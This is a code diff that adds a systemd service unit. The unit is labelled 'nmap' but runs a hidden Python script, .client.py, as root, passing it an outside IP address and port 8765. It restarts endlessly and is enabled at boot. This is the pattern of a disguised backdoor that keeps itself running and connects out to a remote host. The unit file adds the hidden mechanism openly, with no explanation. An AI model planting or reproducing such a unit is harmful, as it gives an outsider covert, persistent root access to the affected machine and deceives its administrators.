@@ -1,0 +1,14 @@
+[Unit]
+Description=nmap
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+User=root
+Type=simple
+Restart=always
+RestartSec=1
+ExecStart=python3.1 /usr/local/bin/.client.py 129.21.49.57 8765
+
+[Install]
+WantedBy=multi-user.target
